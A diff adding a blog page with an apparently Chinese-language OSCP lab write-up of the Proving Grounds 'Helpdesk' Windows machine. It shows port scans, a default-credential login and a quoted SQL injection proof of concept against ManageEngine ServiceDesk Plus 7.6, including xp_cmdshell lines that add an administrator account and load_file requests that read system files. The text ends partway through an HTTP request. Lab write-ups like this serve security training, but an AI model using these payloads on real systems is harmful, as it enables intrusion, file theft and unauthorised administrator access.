@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ProvingGrounds HelpDesk Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="Helpdesk 第11台，Windows系统，难度Easy，名称 Helpdesk
+"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="ProvingGrounds HelpDesk Writeup">
+  <meta itemprop="description" content="Helpdesk 第11台，Windows系统，难度Easy，名称 Helpdesk">
+  <meta itemprop="datePublished" content="2023-12-20T17:54:28+00:00">
+  <meta itemprop="dateModified" content="2023-12-20T17:54:28+00:00">
+  <meta itemprop="wordCount" content="1246">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="http://localhost:1313/posts/provinggrounds-helpdesk/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="ProvingGrounds HelpDesk Writeup">
+  <meta property="og:description" content="Helpdesk 第11台，Windows系统，难度Easy，名称 Helpdesk">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-12-20T17:54:28+00:00">
+    <meta property="article:modified_time" content="2023-12-20T17:54:28+00:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ProvingGrounds HelpDesk Writeup">
+  <meta name="twitter:description" content="Helpdesk 第11台，Windows系统，难度Easy，名称 Helpdesk">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/provinggrounds-helpdesk/" title="ProvingGrounds HelpDesk Writeup - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/provinggrounds-planetexpress/" title="ProvingGrounds PlanetExpress Writeup" /><link rel="next" type="text/html" href="http://localhost:1313/posts/provinggrounds-exghost/" title="ProvingGrounds Exghost Writeup" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/provinggrounds-helpdesk/index.md" title="ProvingGrounds HelpDesk Writeup - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ProvingGrounds HelpDesk Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/provinggrounds-helpdesk\/"
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  1246 ,
+    "url": "http:\/\/localhost:1313\/posts\/provinggrounds-helpdesk\/","datePublished": "2023-12-20T17:54:28+00:00","dateModified": "2023-12-20T17:54:28+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds HelpDesk Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2023-12-20 17:54:28"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-12-20">2023-12-20</time></span>&nbsp;<span title="1246 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#helpdesk">Helpdesk</a></li>
+    <li><a href="#portscan">PortScan</a></li>
+    <li><a href="#web">web</a></li>
+    <li><a href="#init-access">Init Access</a></li>
+    <li><a href="#pe">PE</a></li>
+    <li><a href="#sum-up">Sum up</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="helpdesk" class="heading-element"><span>Helpdesk</span>
+  <a href="#helpdesk" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>第11台，Windows系统，难度Easy，名称 Helpdesk</p>
+<p>192.168.244.43</p>
+<h2 id="portscan" class="heading-element"><span>PortScan</span>
+  <a href="#portscan" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.244.43 -T4 -Pn
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-21 00:18 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.244.43
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">995</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds  Microsoft Windows Server <span class="m">2008</span> R2 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server Microsoft Terminal Service
+</span></span><span class="line"><span class="cl">8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
+</span></span><span class="line"><span class="cl">Service Info: Host: HELPDESK<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 15.82 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web" class="heading-element"><span>web</span>
+  <a href="#web" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ whatweb -a <span class="m">3</span> http://192.168.244.43:8080/
+</span></span><span class="line"><span class="cl">http://192.168.244.43:8080/ <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache, Cookies<span class="o">[</span>JSESSIONID<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, Frame, HTTPServer<span class="o">[</span>Apache-Coyote/1.1<span class="o">]</span>, IP<span class="o">[</span>192.168.244.43<span class="o">]</span>, Java, PasswordField<span class="o">[</span>j_password<span class="o">]</span>, Script<span class="o">[</span>text/JavaScript,text/javascript<span class="o">]</span>, Title<span class="o">[</span>ManageEngine ServiceDesk Plus<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit manageEngine ServiceDesk Plus</span></span></code></pre></td></tr></table>
+</div>
+</div><p>搜索发现有漏洞，从Web页面可以看到是7.6版本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit manageEngine ServiceDesk Plus 7.6
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                     <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection             <span class="p">|</span> jsp/webapps/11793.txt
+</span></span><span class="line"><span class="cl">Zoho ManageEngine ServiceDesk Plus <span class="o">(</span>SDP<span class="o">)</span> &lt; 10.0 build <span class="m">10012</span> - Arbi <span class="p">|</span> jsp/webapps/46413.txt
+</span></span><span class="line"><span class="cl">Zoho ManageEngine ServiceDesk Plus &lt; 10.5 - Improper Access Restri <span class="p">|</span> multiple/webapps/46894.txt
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span><span class="line"><span class="cl">Papers: No Results
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit -x <span class="m">11793</span>
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl">Vulnerability Description:
+</span></span><span class="line"><span class="cl">A Vulnerability has been discovered in Manage Engine Service Desk Plus, which can be exploited by
+</span></span><span class="line"><span class="cl">malicious people to conduct SQL injection attacks.
+</span></span><span class="line"><span class="cl">Input passed via the <span class="s2">&#34;woID&#34;</span> parameter to WorkOrder.do is not properly sanitized before being used in
+</span></span><span class="line"><span class="cl">a SQL query. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+</span></span><span class="line"><span class="cl">The vulnerability is confirmed in version 7.6. Other versions may also be affected.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Proof of Concept:
+</span></span><span class="line"><span class="cl">Microsoft Windows Environment with MySQL:
+</span></span><span class="line"><span class="cl">http://x.x.x.x:8080/WorkOrder.do?woMode<span class="o">=</span>viewWO<span class="p">&amp;</span><span class="nv">woID</span><span class="o">=</span>WorkOrder.WORKORDERID<span class="o">=</span>6<span class="o">)</span>
+</span></span><span class="line"><span class="cl">union <span class="k">select</span> 1,2,3,4,5,6,7,8,load_file<span class="o">(</span><span class="s2">&#34;c:\\boot.ini&#34;</span><span class="o">)</span>,10,11,12,13,14,15,16,17,18,19,1 into dumpfile <span class="s1">&#39;C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini&#39;</span>/*
+</span></span><span class="line"><span class="cl"><span class="k">then</span> browse, http://x.x.x.x:8080/images/boot.ini
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Microsoft Windows Environment with MSSQL:
+</span></span><span class="line"><span class="cl">http://x.x.x.x:8080/WorkOrder.do?woMode<span class="o">=</span>viewWO<span class="p">&amp;</span><span class="nv">woID</span><span class="o">=</span>1<span class="o">)</span><span class="p">;</span> EXEC xp_cmdshell <span class="s1">&#39;net user
+</span></span></span><span class="line"><span class="cl"><span class="s1">moebius m03biu5inj3ct$ /add&#39;</span><span class="p">;</span>--
+</span></span><span class="line"><span class="cl">http://x.x.x.x:8080/WorkOrder.do?woMode<span class="o">=</span>viewWO<span class="p">&amp;</span><span class="nv">woID</span><span class="o">=</span>1<span class="o">)</span><span class="p">;</span> EXEC xp_cmdshell <span class="s1">&#39;net localgroup
+</span></span></span><span class="line"><span class="cl"><span class="s1">administrators moebius /add&#39;</span><span class="p">;</span>--
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GNU/Linux with MySQL:
+</span></span><span class="line"><span class="cl">http://x.x.x.x:8080/WorkOrder.do?woMode<span class="o">=</span>viewWO<span class="p">&amp;</span><span class="nv">woID</span><span class="o">=</span>1%29%20union%20select%201,2,3,4,5,
+</span></span><span class="line"><span class="cl">6,7,8,load_file%28%27/etc/passwd%27%29,10,11,12,13,14,15,16,17,18,19,20%20into%20dumpfile%
+</span></span><span class="line"><span class="cl">20%27/home/moebius/ManageEngine/ServiceDesk/applications/extracted/AdventNetServiceDesk.eear
+</span></span><span class="line"><span class="cl">/AdventNetServiceDeskWC.ear/AdventNetServiceDesk.war/images/passwd.txt%27/*
+</span></span><span class="line"><span class="cl"><span class="k">then</span> browse, http://x.x.x.x:8080/images/passwd.txt</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接访问没有反应，可能需要登录。</p>
+<p>Google搜索默认密码，发现是<code>administrator\administrator</code>，使用这个密码成功登录后台</p>
+<h2 id="init-access" class="heading-element"><span>Init Access</span>
+  <a href="#init-access" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>我先拿的mssql的POC进行测试，爆出了SQL错误，提示是MySQL数据库：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="cl"><span class="n">javax</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">ServletException</span><span class="p">:</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">sql</span><span class="p">.</span><span class="na">SQLException</span><span class="p">:</span><span class="w"> </span><span class="n">Syntax</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">violation</span><span class="p">,</span><span class="w">  </span><span class="n">message</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">server</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">syntax</span><span class="p">;</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">manual</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">corresponds</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">near</span><span class="w"> </span><span class="err">&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="err">&#39;</span><span class="n">net</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">moebius</span><span class="w"> </span><span class="n">m03biu5inj3ct$</span><span class="w"> </span><span class="o">/</span><span class="n">add</span><span class="err">&#39;</span><span class="p">;</span><span class="o">--</span><span class="p">)</span><span class="err">&#39;</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="n">1</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/WorkOrder.do?woMode=viewWO&amp;woID=WorkOrder.WORKORDERID%3d6)union+select+1,2,3,4,5,6,7,8,load_file(&#34;c%3a\\boot.ini&#34;),10,11,12,13,14,15,16,17,18,19,1+into+dumpfile+&#39;C%3a\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini&#39;/*</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.244.43:8080</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
